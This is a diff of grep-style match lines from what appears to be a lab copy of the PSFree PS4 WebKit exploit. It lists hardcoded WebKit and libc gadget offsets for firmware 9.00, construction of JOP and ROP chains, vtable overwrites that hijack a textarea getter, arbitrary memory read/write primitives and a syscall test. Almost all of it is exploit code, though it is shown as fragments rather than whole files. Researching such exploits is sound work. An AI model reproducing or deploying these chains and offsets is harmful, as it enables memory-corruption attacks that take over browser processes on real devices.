@@ -1,0 +1,1000 @@
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:30:    find_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:32:    resolve_import,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:33:    init_syscall_array,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:37:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:43:const syscall_array = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:45:const offset_func_exec = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:46:const offset_textarea_impl = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:47:const offset_js_inline_prop = 0x10;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:49:// WebKit offsets of imported functions
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:50:const offset_wk_stack_chk_fail = 0x178;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:51:const offset_wk_memcpy = 0x188;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:53:// libSceLibcInternal offsets
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:54:const offset_libc_setjmp = 0x24F04;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:55:const offset_libc_longjmp = 0x29448;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:71:let libwebkit_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:72:// libkernel_web.sprx
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:73:let libkernel_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:77:// Chain implementation based on Chain803. Replaced offsets that changed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:78:// between versions. Replaced gadgets that were missing with new ones that
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:81:// gadgets for the JOP chain
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:83:// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:84:// because jop1-5 was the original chain used by the old implementation of
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:85:// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:89:const ta_jop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:97:// ta_jop1 pushed another object (via the call instruction) but we want no
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:99:// jop2 later. So we pop the return address pushed by ta_jop1.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:102:const ta_jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:106:const ta_jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:113:const jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:119:const jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:124:const jop4 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:128:const jop5 = 'pop rsp; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:142:const rop_epilogue = 'leave; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:144:const webkit_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:181:    [jop2] : 0x0000000000683800,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:182:    [jop3] : 0x0000000000303906,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:183:    [jop4] : 0x00000000028bd332,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:184:    [jop5] : 0x000000000004e293,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:186:    [ta_jop1] : 0x00000000004e62a4,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:187:    [ta_jop2] : 0x00000000021fce7e,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:188:    [ta_jop3] : 0x00000000019becb4,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:191:const libc_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:195:    'setjmp' : offset_libc_setjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:196:    'longjmp' : offset_libc_longjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:199:const gadgets = new Map();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:203:    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:205:    const libwebkit_base = find_base(textarea_vtable, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:208:        libwebkit_base
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:209:        .add(offset_wk_stack_chk_fail)
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:211:    const stack_chk_fail_addr = resolve_import(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:216:    const libkernel_base = find_base(stack_chk_fail_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:218:    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:219:    const memcpy_addr = resolve_import(memcpy_import, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:220:    const libc_base = find_base(memcpy_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:223:        libwebkit_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:224:        libkernel_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:229:function init_gadget_map(gadget_map, offset_map, base_addr) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:230:    for (const [insn, offset] of offset_map) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:231:        gadget_map.set(insn, base_addr.add(offset));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:244:        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:245:        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:256:        this.push_gadget(rop_epilogue);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:292:    //     chain.push_gadget('mov rax, 0; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:294:    //     chain.push_gadget('pop rbx; ret'); // always executed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:305:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:307:        this.push_gadget('neg rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:308:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:310:        this.push_gadget('adc esi, esi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:311:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:313:        this.push_gadget('mov qword ptr [rdi], rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:321:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:323:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:326:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:330:        this.push_gadget('neg rax; and rax, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:331:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:333:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:343:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:347:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:354:        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:355:        this.push_gadget('mov rdx, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:360:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:362:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:368:        this.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:373:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:375:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:380:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:382:        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:387:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:389:        this.push_gadget('pop rsi; jmp qword ptr [rax + 0x1c]');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:411:        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:422:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:426:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:428:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:431:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:432:        this.push_value(this.get_gadget('ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:433:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:435:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:437:        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:450:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:452:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:466:    syscall(...args) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:468:            throw Error('syscall() needs an empty chain');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:470:        this.push_syscall(...args);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:488:        // Only offset 0x1c8 will be used when calling the scrollLeft getter
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:501:        // 0x1b8 is the offset of the scrollLeft getter native function
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:502:        rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:503:        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:504:        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:511:        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:512:        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:513:        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:514:        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:515:        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:519:        const jop_buffer = new Uint8Array(8);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:520:        const jop_buffer_p = get_view_vector(jop_buffer);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:521:        this.jop_buffer = jop_buffer;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:523:        rw.write64(jop_buffer, 0, rax_ptrs_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:525:        rw.write64(vtable, 8, jop_buffer_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:544:    [libwebkit_base, libkernel_base, libc_base] = get_bases();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:546:    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:547:    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:548:    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:549:    debug_log('syscall_array:');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:550:    debug_log(syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:551:    Chain.init_class(gadgets, syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:554:function test_rop(Chain) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:560:    setjmp_addr = gadgets.get('setjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:561:    longjmp_addr = gadgets.get('longjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:566:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:594:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:597:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:603:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:605:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:611:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:613:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:626:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:629:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:635:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:637:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:643:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:645:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:654:    debug_log('test syscall getuid()');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:656:    // Set the return value to some random value. If the syscall worked, then
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:661:    chain.syscall('getuid');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:665:        die('syscall getuid failed');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/900.mjs:670:test_rop(Chain);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/code.mjs:1:rop.mjs
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/config.mjs:18:// webkitgtk 2.34.4 was used to develop the portable parts of the exploit
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/config.mjs:21:// webkitgtk 2.34.4 was built with cmake variable ENABLE_JIT=OFF, that variable
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:28:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:102:// We loop a couple of times by num_loop in allocating memory and dropping
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:103:// references to it. Even though we dropped the references immediately, memory
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:257:        const str_arr = Object.getOwnPropertyNames(obj);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:303:    let props = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:305:        props.push({ value: 0x43434343 });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:306:        props.push({ value: view_leak_arr[i] });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:319:        Object.defineProperties({}, props);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:327:                // check if PropertyDescriptor
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:407:        // Create a butterfy with the "a" property as the first. leaker is a
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:409:        // properties and the butterfly is immediately created.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:410:        leaker.a = 0; // dummy value, we just want to create the "a" property
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:454:// (m_mode = FastTypedArray). Requesting the buffer property ("view.buffer")
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:633:// is to make dropping all its references easy (change the value of the global
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit.mjs:646:    // r contains a reference to rstr, drop it for setup_arw2()
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:28:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:103:// We loop a couple of times by num_loop in allocating memory and dropping
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:104:// references to it. Even though we dropped the references immediately, memory
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:256:        const str_arr = Object.getOwnPropertyNames(obj);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:302:    let props = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:304:        props.push({ value: 0x43434343 });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:305:        props.push({ value: view_leak_arr[i] });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:318:        Object.defineProperties({}, props);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:326:                // check if PropertyDescriptor
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:419:        // Create a butterfy with the "a" property as the first. leaker is a
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:421:        // properties and the butterfly is immediately created.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:422:        leaker.a = 0; // dummy value, we just want to create the "a" property
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:604:// is to make dropping all references to it easy (change the value of the
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:617:    // r contains a reference to rstr, drop it for setup_arw2()
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:625:    const offset_num_loop =
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:628:    const offset_target_addr =
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:632:    const num_loop_str = offset_num_loop.toString(16);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:633:    const target_addr_str = offset_target_addr.toString(16);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:641:    write32(view, offset_num_loop, 1);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:642:    write64(view, offset_target_addr, jsview[2]);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:643:    debug_log(`0x${num_loop_str}: ${read32(view, offset_num_loop)}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit800.mjs:644:    debug_log(`0x${target_addr_str}: ${read64(view, offset_target_addr)}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:28:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:102:// We loop a couple of times by num_loop in allocating memory and dropping
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:103:// references to it. Even though we dropped the references immediately, memory
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:257:        const str_arr = Object.getOwnPropertyNames(obj);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:303:    let props = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:305:        props.push({ value: 0x43434343 });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:306:        props.push({ value: view_leak_arr[i] });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:319:        Object.defineProperties({}, props);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:327:                // check if PropertyDescriptor
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:407:        // Create a butterfy with the "a" property as the first. leaker is a
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:409:        // properties and the butterfly is immediately created.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:410:        leaker.a = 0; // dummy value, we just want to create the "a" property
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:454:// (m_mode = FastTypedArray). Requesting the buffer property ("view.buffer")
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:640:// is to make dropping all its references easy (change the value of the global
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploit900.mjs:653:    // r contains a reference to rstr, drop it for setup_arw2()
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:28:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:103:// We loop a couple of times by num_loop in allocating memory and dropping
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:104:// references to it. Even though we dropped the references immediately, memory
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:256:        const str_arr = Object.getOwnPropertyNames(obj);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:302:    let props = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:304:        props.push({ value: 0x43434343 });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:305:        props.push({ value: view_leak_arr[i] });
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:318:        Object.defineProperties({}, props);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:326:                // check if PropertyDescriptor
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:418:        // Create a butterfy with the "a" property as the first. leaker is a
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:420:        // properties and the butterfly is immediately created.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:421:        leaker.a = 0; // dummy value, we just want to create the "a" property
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:619:// is to make dropping all references to it easy (change the value of the
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:632:    // r contains a reference to rstr, drop it for setup_arw2()
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:640:    const offset_num_loop =
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:643:    const offset_target_addr =
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:647:    const num_loop_str = offset_num_loop.toString(16);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:648:    const target_addr_str = offset_target_addr.toString(16);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:656:    write32(view, offset_num_loop, 1);
